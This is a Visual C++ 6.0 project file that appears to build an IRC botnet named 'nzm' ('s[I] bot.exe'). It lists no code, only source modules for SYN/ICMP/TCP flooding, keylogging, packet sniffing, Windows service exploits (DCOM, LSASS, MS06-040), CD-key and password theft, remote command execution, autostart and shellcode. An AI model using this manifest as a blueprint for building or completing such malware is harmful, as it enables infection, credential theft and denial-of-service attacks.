# Microsoft Developer Studio Project File - Name="nzm" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=nzm - WIN32 RELEASE
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "nzm.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "nzm.mak" CFG="nzm - WIN32 RELEASE"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "nzm - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe
# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "obj"
# PROP BASE Intermediate_Dir "obj"
# PROP BASE Target_Dir "obj"
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "exe"
# PROP Intermediate_Dir "obj"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /W3 /GX /O1 /I "C:\Program Files\Microsoft SDK\Include" /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386
# ADD LINK32 /nologo /subsystem:windows /machine:I386 /out:"exe/s[I] bot.exe"
# SUBTRACT LINK32 /pdb:none
# Begin Target

# Name "nzm - Win32 Release"
# Begin Group "s[I] v1.0"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Group "DDOS"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\cpp\ddos\ddos.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\ddos\icmpflood.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\ddos\supersyn.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\ddos\synflood.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\ddos\tcpflood.cpp
# End Source File
# End Group
# Begin Group "KEYLOG & SNIFFING"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\cpp\modules\keylogger.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\modules\psniff.cpp
# End Source File
# End Group
# Begin Group "VULN"

# PROP Default_Filter ""
# Begin Group "Scanners"

# PROP Default_Filter ".cpp"
# Begin Source File

SOURCE=.\cpp\exploits\asn.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\exploits\dcass.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\exploits\dcom.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\exploits\lsass.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\exploits\ms04_007_asn1.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\exploits\MS0640.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\exploits\wks.CPP
# End Source File
# Begin Source File

SOURCE=.\cpp\exploits\wkssvc.cpp
# End Source File
# End Group
# Begin Group "FTPD"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\cpp\xfer\ftpd.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\modules\httpd.cpp
# End Source File
# End Group
# Begin Group "TFTP"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\cpp\xfer\tftpd.cpp
# End Source File
# End Group
# Begin Source File

SOURCE=.\cpp\scan\advscan.cpp
# End Source File
# End Group
# Begin Group "BOUNCERS"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\cpp\modules\redirect.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\modules\socks4.cpp
# End Source File
# End Group
# Begin Group "TOOLS"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\cpp\modules\capture.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\modules\cdkeys.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\modules\findfile.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\modules\findpass.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\loaddlls.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\misc.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\netutils.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\ddos\pingudp.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\modules\remotecmd.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\sysinfo.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\modules\visit.cpp
# End Source File
# End Group
# Begin Group "CORE FILES"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\cpp\core\aliaslog.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\autostart.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\crc32.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\crypt.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\modules\dcc.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\download.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\driveinfo.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\ehandler.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\fphost.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\ident.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\irc_send.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\net.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\nzm.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\processes.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\random.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\rndnick.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\scan\scan.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\modules\secure.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\session.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\shellcode.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\threads.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\wildcard.cpp
# End Source File
# End Group
# End Group
# Begin Group "HEADERS"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Group "CONFIGURATION"

# PROP Default_Filter "*.h"
# Begin Source File

SOURCE=.\config\cfg.h
# End Source File
# End Group
# Begin Source File

SOURCE=.\headers\advscan.h
# End Source File
# Begin Source File

SOURCE=.\headers\aliaslog.h
# End Source File
# Begin Source File

SOURCE=.\headers\asn.h
# End Source File
# Begin Source File

SOURCE=.\headers\autostart.h
# End Source File
# Begin Source File

SOURCE=.\headers\capture.h
# End Source File
# Begin Source File

SOURCE=.\headers\cdkeys.h
# End Source File
# Begin Source File

SOURCE=.\headers\crc32.h
# End Source File
# Begin Source File

SOURCE=.\headers\crypt.h
# End Source File
# Begin Source File

SOURCE=.\headers\dcass.h
# End Source File
# Begin Source File

SOURCE=.\headers\dcc.h
# End Source File
# Begin Source File

SOURCE=.\headers\dcom.h
# End Source File
# Begin Source File

SOURCE=.\headers\ddos.h
# End Source File
# Begin Source File

SOURCE=.\headers\defines.h
# End Source File
# Begin Source File

SOURCE=.\headers\download.h
# End Source File
# Begin Source File

SOURCE=.\headers\driveinfo.h
# End Source File
# Begin Source File

SOURCE=.\headers\ehandler.h
# End Source File
# Begin Source File

SOURCE=.\headers\externs.h
# End Source File
# Begin Source File

SOURCE=.\headers\findfile.h
# End Source File
# Begin Source File

SOURCE=.\headers\findpass.h
# End Source File
# Begin Source File

SOURCE=.\headers\fphost.h
# End Source File
# Begin Source File

SOURCE=.\headers\ftpd.h
# End Source File
# Begin Source File

SOURCE=.\headers\functions.h
# End Source File
# Begin Source File

SOURCE=.\headers\globals.h
# End Source File
# Begin Source File

SOURCE=.\headers\httpd.h
# End Source File
# Begin Source File

SOURCE=.\headers\icmpflood.h
# End Source File
# Begin Source File

SOURCE=.\headers\ident.h
# End Source File
# Begin Source File

SOURCE=.\headers\includes.h
# End Source File
# Begin Source File

SOURCE=.\headers\irc_send.h
# End Source File
# Begin Source File

SOURCE=.\headers\keylogger.h
# End Source File
# Begin Source File

SOURCE=.\headers\loaddlls.h
# End Source File
# Begin Source File

SOURCE=.\headers\lsass.h
# End Source File
# Begin Source File

SOURCE=.\headers\misc.h
# End Source File
# Begin Source File

SOURCE=.\headers\ms04_007_asn1.h
# End Source File
# Begin Source File

SOURCE=".\headers\ms06-40-w2k.h"
# End Source File
# Begin Source File

SOURCE=".\headers\ms06-40-wXP.h"
# End Source File
# Begin Source File

SOURCE=.\headers\MS0640.h
# End Source File
# Begin Source File

SOURCE=.\headers\net.h
# End Source File
# Begin Source File

SOURCE=.\headers\netutils.h
# End Source File
# Begin Source File

SOURCE=.\headers\nicklist.h
# End Source File
# Begin Source File

SOURCE=.\headers\nzm.h
# End Source File
# Begin Source File

SOURCE=.\headers\passwd.h
# End Source File
# Begin Source File

SOURCE=.\headers\pingudp.h
# End Source File
# Begin Source File

SOURCE=.\headers\processes.h
# End Source File
# Begin Source File

SOURCE=.\headers\psniff.h
# End Source File
# Begin Source File

SOURCE=.\headers\random.h
# End Source File
# Begin Source File

SOURCE=.\headers\redirect.h
# End Source File
# Begin Source File

SOURCE=.\headers\remotecmd.h
# End Source File
# Begin Source File

SOURCE=.\headers\rndnick.h
# End Source File
# Begin Source File

SOURCE=.\headers\scan.h
# End Source File
# Begin Source File

SOURCE=.\headers\secure.h
# End Source File
# Begin Source File

SOURCE=.\headers\session.h
# End Source File
# Begin Source File

SOURCE=.\headers\shellcode.h
# End Source File
# Begin Source File

SOURCE=.\headers\socks4.h
# End Source File
# Begin Source File

SOURCE=.\headers\supersyn.h
# End Source File
# Begin Source File

SOURCE=.\headers\synflood.h
# End Source File
# Begin Source File

SOURCE=.\headers\sysinfo.h
# End Source File
# Begin Source File

SOURCE=.\headers\tcpflood.h
# End Source File
# Begin Source File

SOURCE=.\headers\tcpip.h
# End Source File
# Begin Source File

SOURCE=.\headers\tftpd.h
# End Source File
# Begin Source File

SOURCE=.\headers\threads.h
# End Source File
# Begin Source File

SOURCE=.\headers\visit.h
# End Source File
# Begin Source File

SOURCE=.\headers\wildcard.h
# End Source File
# Begin Source File

SOURCE=.\headers\wks.h
# End Source File
# Begin Source File

SOURCE=.\headers\wkssvc.h
# End Source File
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# End Group
# End Target
# End Project
